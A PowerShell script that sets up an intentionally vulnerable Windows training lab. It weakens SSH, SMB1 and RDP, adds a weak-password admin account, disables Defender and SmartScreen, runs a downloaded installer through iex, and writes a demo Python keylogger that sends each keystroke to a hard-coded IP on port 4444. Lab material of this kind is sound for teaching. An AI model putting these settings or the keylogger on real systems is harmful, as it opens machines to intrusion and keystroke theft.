# Security Warning: Run this only in an isolated lab environment
# Requires Admin privileges
# Tested on Windows 10/11 Pro 21H2+

Set-ExecutionPolicy Bypass -Scope Process -Force

# Lab Configuration
$labBase = "C:\CyberLab"
$pythonVersion = "3.12.1"
$testIP = "192.168.1.100"

function Initialize-Lab {
    param(
        [string]$LabPath,
        [string]$PythonVersion
    )

    # Create lab structure
    $dirs = @(
        "$LabPath\Malware_Samples",
        "$LabPath\Network_Traffic",
        "$LabPath\Victim_Files",
        "$LabPath\Tools",
        "$LabPath\Test_Directories\ransomware_test",
        "$LabPath\Test_Directories\keylogger_test",
        "$LabPath\Test_Directories\worm_test"
    )

    $dirs | ForEach-Object {
        New-Item -Path $_ -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    }

    # Create test files
    1..5 | ForEach-Object {
        New-Item -Path "$LabPath\Test_Directories\ransomware_test\file$_.test" -ItemType File -ErrorAction SilentlyContinue
        New-Item -Path "$LabPath\Test_Directories\keylogger_test\test$_.txt" -ItemType File -ErrorAction SilentlyContinue
    }

    # Install required system features
    Write-Host "[*] Enabling Windows features..."
    Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All -All -NoRestart -ErrorAction SilentlyContinue
    Enable-WindowsOptionalFeature -Online -FeatureName Containers -All -NoRestart -ErrorAction SilentlyContinue

    # Configure OpenSSH Server
    try {
        Write-Host "[*] Installing OpenSSH Server..."
        $sshCapability = Get-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
        if ($sshCapability.State -ne 'Installed') {
            Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop
        }

        if (Get-Service sshd -ErrorAction SilentlyContinue) {
            Start-Service sshd -ErrorAction SilentlyContinue
            Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
        }
    }
    catch {
        Write-Warning "OpenSSH Server installation failed: $_"
    }

    # Create vulnerable test user
    Write-Host "[*] Creating lab user account..."
    $password = ConvertTo-SecureString "Password123" -AsPlainText -Force
    try {
        New-LocalUser -Name "labuser" -Password $password -Description "Vulnerable Lab Account" -ErrorAction Stop
        Add-LocalGroupMember -Group "Administrators" -Member "labuser" -ErrorAction Stop
        Add-LocalGroupMember -Group "Remote Desktop Users" -Member "labuser" -ErrorAction Stop
    }
    catch {
        Write-Warning "User creation failed: $_"
    }
}

function Configure-SSH-Vulnerabilities {
    Write-Host "[*] Configuring vulnerable SSH settings..."
    try {
        if (Get-Service sshd -ErrorAction SilentlyContinue) {
            $sshdConfig = @"
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
ChallengeResponseAuthentication no
UsePAM yes
AllowTcpForwarding yes
X11Forwarding yes
"@
            Set-Content -Path "$env:ProgramData\ssh\sshd_config" -Value $sshdConfig -Force
            Restart-Service sshd -ErrorAction Stop
            Write-Host "[+] SSH service reconfigured"
        }
        else {
            Write-Warning "SSH service not available"
        }
    }
    catch {
        Write-Warning "SSH configuration failed: $_"
    }
}

function Configure-SMB-Vulnerabilities {
    Write-Host "[*] Creating insecure SMB shares..."
    try {
        # Install SMB Server if missing
        if (-not (Get-WindowsFeature FS-SMB1 -ErrorAction SilentlyContinue).Installed) {
            Install-WindowsFeature FS-SMB1 -ErrorAction Stop
        }

        # Create vulnerable directory
        New-Item -Path "C:\Vulnerable" -ItemType Directory -Force -ErrorAction Stop | Out-Null

        # Set insecure permissions
        icacls "C:\Vulnerable" /grant "Everyone:(OI)(CI)F" /T /C

        # Configure SMB settings
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "SMB1" -Type DWORD -Value 1 -Force
        Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Stop
        Set-SmbServerConfiguration -RequireSecuritySignature $false -Force -ErrorAction Stop
        Set-SmbServerConfiguration -AllowInsecureGuestAuth $true -Force -ErrorAction Stop

        # Create vulnerable share
        New-SmbShare -Name "VULNERABLE_SHARE" -Path "C:\Vulnerable" -FullAccess "Everyone" -ErrorAction Stop
        Write-Host "[+] SMB vulnerabilities configured"
    }
    catch {
        Write-Warning "SMB configuration failed: $_"
    }
}

function Configure-RDP-Vulnerabilities {
    Write-Host "[*] Lowering RDP security..."
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MinEncryptionLevel" -Value 1 -Force
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "DisableDomainCreds" -Value 0 -Force
        Write-Host "[+] RDP vulnerabilities configured"
    }
    catch {
        Write-Warning "RDP configuration failed: $_"
    }
}

function Install-LabDependencies {
    # Install Chocolatey
    Write-Host "[*] Installing Chocolatey..."
    try {
        Set-ExecutionPolicy Bypass -Scope Process -Force
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
        iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
    }
    catch {
        Write-Warning "Chocolatey installation failed: $_"
    }

    # Install Python
    Write-Host "[*] Installing Python $pythonVersion..."
    try {
        choco install python --version $pythonVersion -y --force
        refreshenv
    }
    catch {
        Write-Warning "Python installation failed: $_"
    }

    # Install Python packages
    Write-Host "[*] Installing Python packages..."
    try {
        python -m pip install --upgrade pip
        python -m pip install keyboard paramiko cryptography pyautogui psutil pillow zstandard mss pyautogui tkinter
    }
    catch {
        Write-Warning "Python package installation failed: $_"
    }

    # Install networking tools
    Write-Host "[*] Installing network tools..."
    try {
        choco install wireshark nmap -y
    }
    catch {
        Write-Warning "Network tools installation failed: $_"
    }

    # Download PsExec
    Write-Host "[*] Downloading PsExec..."
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile("https://live.sysinternals.com/tools/PsExec.exe", "$labBase\Tools\PsExec.exe")
    }
    catch {
        Write-Warning "PsExec download failed: $_"
    }
}

function Configure-Firewall {
    Write-Host "[*] Configuring firewall rules..."
    $ports = @(21, 22, 23, 135, 139, 445, 3389, 4444, 1337, 443)
    try {
        New-NetFirewallRule -DisplayName "Lab_TCP" -Direction Inbound -LocalPort $ports -Protocol TCP -Action Allow -ErrorAction Stop
        New-NetFirewallRule -DisplayName "Lab_UDP" -Direction Inbound -LocalPort $ports -Protocol UDP -Action Allow -ErrorAction Stop
    }
    catch {
        Write-Warning "Firewall configuration failed: $_"
    }

    Write-Host "[*] Disabling security features..."
    try {
        # Disable Defender via registry
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force

        # Disable SmartScreen
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Force

        # Disable Network Protection
        if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection")) {
            New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection" -Force
        }
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection" -Name "EnableNetworkProtection" -Value 0 -Force

        # Add exclusions
        Add-MpPreference -ExclusionPath "$labBase\*" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "python.exe", "PsExec.exe" -ErrorAction SilentlyContinue
    }
    catch {
        Write-Warning "Security configuration failed: $_"
    }
}

function Create-ExampleFiles {
    Write-Host "[*] Generating example files..."
    try {
        @"
import keyboard
import socket

HOST = '$testIP'
PORT = 4444

def key_handler(event):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(event.name.encode())

keyboard.on_press(key_handler)
keyboard.wait()
"@ | Out-File "$labBase\Malware_Samples\demo_keylogger.py" -Force

        # Create safety scripts
        Create-SafetyScripts
    }
    catch {
        Write-Warning "File creation failed: $_"
    }
}

function Create-SafetyScripts {
    Write-Host "[*] Creating safety scripts..."
    try {
        @"
# Lab Cleanup Script
Remove-Item -Path "$labBase" -Recurse -Force -ErrorAction SilentlyContinue

# Restore Defender settings
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 0 -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Warn" -Force
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection" -Name "EnableNetworkProtection" -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath "$labBase\*" -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionProcess "python.exe", "PsExec.exe" -ErrorAction SilentlyContinue

# Remove firewall rules
Get-NetFirewallRule -DisplayName "Lab_*" | Remove-NetFirewallRule -Confirm:`$false

# Clean services
Set-Service sshd -StartupType Disabled -ErrorAction SilentlyContinue
Stop-Service sshd -Force -ErrorAction SilentlyContinue

# Remove shares
Remove-SmbShare -Name "VULNERABLE_SHARE" -Force -ErrorAction SilentlyContinue

# Delete user
Remove-LocalUser -Name "labuser" -ErrorAction SilentlyContinue
"@ | Out-File "$labBase\Tools\LabReset.ps1" -Force

        @"
# Network Monitor
& "C:\Program Files\Wireshark\tshark.exe" -i Ethernet0 -f "tcp port 4444 or 443" -w "$labBase\Network_Traffic\lab_capture_%Y-%m-%d_%H-%M-%S.pcapng" -a duration:3600
"@ | Out-File "$labBase\Tools\StartMonitoring.ps1" -Force
    }
    catch {
        Write-Warning "Safety script creation failed: $_"
    }
}

# Main execution
try {
    Write-Host "=== Cyber Lab Setup ==="
    Initialize-Lab -LabPath $labBase -PythonVersion $pythonVersion
    Install-LabDependencies
    Configure-Firewall
    Configure-SSH-Vulnerabilities
    Configure-SMB-Vulnerabilities
    Configure-RDP-Vulnerabilities
    Create-ExampleFiles

    Write-Host @"

=== Lab Setup Complete ===
[!] WARNING: This system is now intentionally vulnerable!

Vulnerabilities Enabled:
- SSH: Root access with weak credentials (labuser/Password123)
- SMB: Version 1 enabled with open shares
- RDP: No authentication required
- Defender: Real-time protection disabled
- Firewall: Critical ports open (21,22,23,445,3389)

Safety Protocols:
- Reset with: .\Tools\LabReset.ps1
- Monitor with: .\Tools\StartMonitoring.ps1

Next Steps:
1. Test malware samples in Malware_Samples directory
2. Use Wireshark to observe network traffic
3. Practice lateral movement techniques
4. Always reset environment after use

"@
}
catch {
    Write-Host "[!] Setup failed: $_"
}